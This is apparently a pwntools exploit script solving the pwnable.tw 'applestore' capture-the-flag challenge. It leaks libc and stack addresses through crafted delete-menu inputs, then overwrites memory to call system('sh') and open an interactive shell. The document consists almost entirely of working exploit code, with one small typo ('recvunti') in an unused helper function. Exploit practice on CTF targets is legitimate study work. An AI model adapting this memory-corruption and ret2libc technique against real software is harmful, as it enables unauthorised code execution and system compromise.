from pwn import *

#r = remote('chall.pwnable.tw', 10104)
r = process("./applestore")
elf = ELF('./applestore')
libc = ELF('./libc_32.so.6')
context.arch = "i386"
context.log_level = "error"

atoi_got = 0x804b040
x = 0 #amount of phone

def List(): #useless
    r.recvuntil('> ')
    r.sendline('1')
    print r.recvuntil('5: iPod Touch - $199')

def Add(item):
    global x
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('> ') #device number
    r.sendline(str(item))
    r.recvuntil('Brilliant! That\'s an amazing idea.')
    x += 1

def Delete(item):
    global x
    r.recvuntil('> ')
    r.sendline('3')
    r.recvuntil('> ') #item number
    r.sendline(str(item))
    r.recvuntil('\n')
    x -= 1
    
def Cart():
    global x
    r.recvuntil('> ')
    r.sendline('4')
    r.recvunti('> ')
    r.sendline('y')
    for i in range(x):
        r.recvuntil('\n')

def Check():
    global x
    r.recvuntil('> ')
    r.sendline('5')
    r.recvuntil('> ')
    r.sendline('y')
    for i in range(x):
        r.recvuntil('\n')
    r.recvuntil('\n') #total
    str1 = r.recvuntil('\n')

def Exit():
    r.recvuntil('> ')
    r.sendline('6')
    
#pass checkout
for i in range(15):
    Add(1)
for i in range(5):
    Add(2)
for i in range(3):
    Add(3)
for i in range(3):
    Add(4)

Check()
#leak
r.recvuntil('> ')
r.sendline('3')
r.recvuntil('> ') #item number
r.sendline("27" + p32(0x0804b040) + "\x00"*8 + p32(elf.bss(0x100)))
r.recvuntil(':')
atoi_add = u32((r.recvuntil(' ')[:4]))
r.recvuntil('\n')

libc_base = atoi_add - libc.symbols['atoi']
system = libc_base + libc.symbols['system']
sh = next(libc.search('sh\x00')) + libc_base
environ = libc_base + libc.symbols['environ']
gets = libc_base + libc.symbols['gets']
print hex(libc_base)
print hex(system)
print hex(gets)
print "sh: ", hex(next(libc.search('sh\x00')) + libc_base)


r.recvuntil('> ')
r.sendline('3')
r.recvuntil('> ') #item number
r.sendline("27" + p32(environ) + "\x00"*12)
r.recvuntil(':')

environ = u32((r.recvuntil(' ')[:4]))
r.recvuntil('\n')
print "environ: ", hex(environ)
#stack = environ - 0x124
#ebp = environ - 0x104
stack = environ - 0xe4
ebp = environ - 0xc4
print "stack:" , hex(stack)
print "ebp: ", hex(ebp)

r.recvuntil('> ')
r.sendline('3')
r.recvuntil('> ') #item number
r.sendline("27" + p32(gets) + p32(0xdeadbeef) + p32(stack) + p32(ebp - 0x8))
r.recvuntil('\n')

r.recvuntil('> ')
r.sendline('06' + p32(0xdeadbeef) + p32(system) + p32(stack) + p32(sh))

r.interactive()


